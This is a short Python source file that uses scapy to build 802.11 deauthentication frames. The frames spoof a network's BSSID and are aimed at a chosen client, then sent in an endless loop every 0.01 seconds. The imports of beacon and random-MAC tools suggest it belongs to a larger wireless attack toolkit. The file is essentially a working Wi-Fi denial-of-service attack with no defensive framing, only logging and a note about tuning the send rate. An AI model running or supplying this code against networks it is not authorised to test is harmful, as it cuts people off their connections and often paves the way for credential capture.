from scapy.all import sendp, Dot11, RadioTap, Dot11Deauth, Dot11Beacon, Dot11Elt, RandMAC
from utils import LOGGER


def deauth(iface: str, BSSID: str, client: str, reason: int = 7) -> None:
    """Send deauthentication packets to a targeted client

    Args:
        iface (str): Interface to use
        BSSID (str): MAC address of target network
        client (str): MAC address of target client
        reason (int, optional): Reasoncode for deauthentication. Defaults to 7.
    """
    LOGGER.debug("Function 'deauth' is running")
    packet = RadioTap() / \
        Dot11(type=0, subtype=12, addr1=client, addr2=BSSID, addr3=BSSID) / \
        Dot11Deauth(reason=reason)
    print(f'SENDING DEAUTH to {BSSID}')
    LOGGER.info("Sending deauth packet to client: '" + client + "' from BSSID: '" + BSSID + "' through interface: '" + iface + "'.")
    sendp(packet, iface=iface, loop=1, inter=0.01)  # TODO: Can we tune this?
